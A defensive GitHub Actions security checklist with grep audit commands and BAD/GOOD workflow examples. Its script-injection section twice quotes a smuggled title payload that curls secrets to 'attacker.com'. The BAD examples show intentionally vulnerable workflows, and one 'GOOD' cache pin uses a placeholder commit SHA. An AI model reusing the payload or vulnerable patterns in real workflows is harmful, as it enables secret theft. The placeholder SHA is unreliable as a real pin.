# CI/CD Security Checks

## Secret Exposure in Logs

Scan for accidental secret printing in workflow files:

```bash
grep -rnE '(echo|print|printf|log)\s.*\$\{?\s*(SECRET|TOKEN|PASSWORD|KEY|CREDENTIAL)' .github/workflows/
grep -rnE 'echo\s+.*\$\{\{.*secrets\.' .github/workflows/
```

Also check for debug mode leaking secrets:

```bash
grep -rn 'ACTIONS_STEP_DEBUG' .github/workflows/
grep -rn 'ACTIONS_RUNNER_DEBUG' .github/workflows/
```

### Fix (CI001)

**BAD:**
```yaml
steps:
  - name: Debug
    run: echo "Token is ${{ secrets.API_TOKEN }}"
  - name: Deploy
    run: |
      echo "Deploying with key: $DEPLOY_KEY"
      curl -H "Authorization: ${{ secrets.DEPLOY_KEY }}" https://api.example.com
    env:
      ACTIONS_STEP_DEBUG: true
```

**GOOD:**
```yaml
steps:
  - name: Deploy
    run: |
      curl -H "Authorization: $DEPLOY_KEY" https://api.example.com
    env:
      DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
      # Never echo secrets; pass via env vars which GitHub auto-masks
```

Never echo or log secrets directly; use environment variables (GitHub automatically masks `secrets.*` values in logs) and disable debug mode in production workflows.

## Unpinned Actions

Flag actions pinned to branch instead of SHA:

```bash
grep -rnE 'uses:\s+\S+@(main|master|v\d+)\s*$' .github/workflows/
```

Secure pattern — pin to full commit SHA:

```yaml
uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0
```

Quick audit — list all action references:

```bash
grep -rn 'uses:' .github/workflows/ | grep -v '@[a-f0-9]\{40\}'
# Shows all actions NOT pinned to a SHA
```

### Fix (CI002)

**BAD:**
```yaml
steps:
  - uses: actions/checkout@v4
  - uses: actions/setup-node@main
  - uses: docker/build-push-action@v5
```

**GOOD:**
```yaml
steps:
  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608    # v4.1.0
  - uses: actions/setup-node@1a4442cacd436585916f1a89e3578a47690a2ba8  # v4.0.2
  - uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56 # v5.1.0
```

Pin all third-party actions to full commit SHAs with a version comment; tag references can be moved by a compromised upstream repository.

## GITHUB_TOKEN Permissions

Check for overly broad permissions:

```bash
grep -A5 'permissions:' .github/workflows/*.yml
```

Principle of least privilege:

```yaml
permissions:
  contents: read
  pull-requests: write
```

Flag `permissions: write-all` or missing permissions block (defaults to broad access). Severity: **HIGH**

### Fix (CI003)

**BAD:**
```yaml
permissions: write-all

jobs:
  build:
    runs-on: ubuntu-latest
    # Or worse: no permissions block at all (defaults to broad access)
```

**GOOD:**
```yaml
permissions:
  contents: read          # Only what's needed

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write      # Scoped per-job when needed
```

Apply the principle of least privilege by declaring explicit, minimal permissions at both workflow and job level.

## Fork PR Security

Flag dangerous `pull_request_target` usage:

```bash
grep -rn 'pull_request_target' .github/workflows/
```

**Why it matters:** `pull_request_target` runs with write permissions and access to secrets, even for PRs from forks. If combined with `actions/checkout` of the PR head, an attacker can execute arbitrary code with repo secrets.

Dangerous pattern:

```yaml
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS
  - run: npm test  # Runs attacker's code with secrets
```

Safe alternative — use `pull_request` for untrusted code, `pull_request_target` only for labeling/commenting.

### Fix (CI005)

**BAD:**
```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test    # Runs attacker-controlled code with secrets access
```

**GOOD:**
```yaml
# Workflow 1: Safe — runs untrusted code without secrets
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test

# Workflow 2: Safe — pull_request_target only for metadata (no code checkout)
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@v5
```

Use `pull_request` for running untrusted code and reserve `pull_request_target` exclusively for non-code operations like labeling or commenting.

## Timeout Configuration

Check for missing timeouts:

```bash
grep -rn 'timeout-minutes:' .github/workflows/
```

Missing timeout allows stuck jobs to run (and bill) indefinitely. Set at job level:

```yaml
jobs:
  build:
    timeout-minutes: 15
```

### Fix (CI006)

**BAD:**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm run build
      # No timeout — a hung process can run for 6 hours (default)
```

**GOOD:**
```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - run: npm run build
        timeout-minutes: 10    # Optional per-step timeout
```

Set `timeout-minutes` at the job level (and optionally per-step) to prevent stuck jobs from consuming CI minutes indefinitely.

## Concurrency Settings

Prevent duplicate runs:

```bash
grep -A3 'concurrency:' .github/workflows/
```

Expected pattern:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

### Fix (CI007)

**BAD:**
```yaml
on:
  push:
    branches: [main]
# No concurrency — pushing 5 commits triggers 5 parallel builds
```

**GOOD:**
```yaml
on:
  push:
    branches: [main]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

Add concurrency controls to cancel redundant in-progress runs when new commits are pushed, saving CI resources and avoiding race conditions.

## Script Injection

Flag direct use of user-controlled input in `run:` blocks:

```bash
grep -rnE 'run:.*\$\{\{\s*github\.event\.(issue|pull_request|comment)\.(title|body|label)' .github/workflows/
```

Unsafe:

```yaml
run: echo "${{ github.event.issue.title }}"
# Title could contain: "; curl attacker.com/steal?t=$SECRET"
```

Safe — use environment variable:

```yaml
env:
  TITLE: ${{ github.event.issue.title }}
run: echo "$TITLE"
```

### Fix (CI008 — Script Injection)

**BAD:**
```yaml
- name: Greet PR author
  run: |
    echo "Thanks for the PR: ${{ github.event.pull_request.title }}"
    # An attacker sets title to: "; curl attacker.com/steal?t=$GITHUB_TOKEN"
```

**GOOD:**
```yaml
- name: Greet PR author
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Thanks for the PR: $PR_TITLE"
    # Env var is safely quoted, not interpolated into the shell command
```

Pass user-controlled GitHub context values through environment variables instead of inline expressions to prevent shell injection attacks.

## Artifact and Cache Poisoning

Flag workflows that restore caches or artifacts without verification:

```bash
grep -rn 'actions/cache@' .github/workflows/
grep -rn 'actions/download-artifact@' .github/workflows/
```

Ensure caches are scoped to branch and artifacts are from trusted workflows only.

### Fix (Cache/Artifact Poisoning)

**BAD:**
```yaml
- uses: actions/cache@v3
  with:
    path: ~/.npm
    key: npm-cache
    # Static key — any branch can poison the cache for all other branches
```

**GOOD:**
```yaml
- uses: actions/cache@1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b  # v4.0.0
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      npm-${{ runner.os }}-
```

Pin cache/artifact actions to SHAs, scope cache keys to OS and lockfile hash, and only restore artifacts from trusted workflow runs.

## Severity Summary

| Check | Severity |
|---|---|
| Secret exposure in logs | CRITICAL |
| pull_request_target + checkout | CRITICAL |
| Script injection | CRITICAL |
| Unpinned actions | HIGH |
| Broad GITHUB_TOKEN permissions | HIGH |
| Missing timeout | MEDIUM |
| No concurrency settings | LOW |
| Unpinned cache/artifact actions | MEDIUM |
